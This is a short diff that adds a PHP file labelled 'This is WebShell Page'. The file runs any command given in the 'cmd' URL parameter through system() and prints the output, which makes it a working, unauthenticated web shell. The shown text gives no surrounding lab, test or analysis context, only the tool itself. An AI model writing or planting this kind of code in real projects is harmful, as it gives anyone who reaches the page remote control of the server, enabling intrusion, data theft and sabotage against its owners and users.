@@ -1,0 +1,15 @@
+<?php
+
+if (isset($_GET['cmd'])) {
+    $ret = system($_GET['cmd']);
+    echo $ret;
+
+}
+
+?>
+
+<html>
+<body>
+This is WebShell Page
+</body>
+</html>
